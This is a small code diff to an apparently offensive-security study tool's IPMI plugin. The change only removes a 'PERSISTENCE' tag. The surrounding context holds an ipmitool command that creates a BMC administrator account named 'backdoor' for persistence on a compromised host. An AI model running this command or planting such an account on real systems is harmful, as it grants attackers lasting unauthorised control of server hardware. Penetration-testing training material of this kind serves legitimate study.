@@ -447,7 +447,7 @@ class IPMIPlugin(ServicePlugin):
                     'metadata': {
                         'command': f'ipmitool user set name 4 backdoor && ipmitool user set password 4 backdoor && ipmitool user priv 4 4',
                         'description': 'If host is compromised, use local BMC interface to create persistent backdoor user',
-                        'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'PERSISTENCE'],
+                        'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                         'flag_explanations': {
                             'user set name 4 backdoor': 'Set username for user ID 4',
                             'user set password 4 backdoor': 'Set password for user ID 4',
